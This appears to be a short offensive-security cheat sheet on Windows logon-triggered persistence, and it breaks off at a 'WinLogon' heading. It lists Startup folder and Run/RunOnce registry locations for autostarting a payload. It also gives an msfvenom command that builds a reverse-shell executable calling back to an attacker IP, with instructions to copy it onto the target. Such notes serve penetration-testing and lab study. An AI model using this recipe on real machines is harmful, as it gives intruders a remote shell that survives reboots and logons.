# Windows Persistence - Logon Triggered

## Startup Folder

Each user has a:
- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`
To force all users to run a payload user: 
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$attack_ip LPORT=$port -f exe -o revshell.exe
```
Transfer to target machine and copy to one of the above locations.

## Run / RunOnce
Instead of a directory you can modify the registery entries to specify application to run at logon:
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
-   `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

`Right-Click -> New -> Expandable String Value`

## WinLogon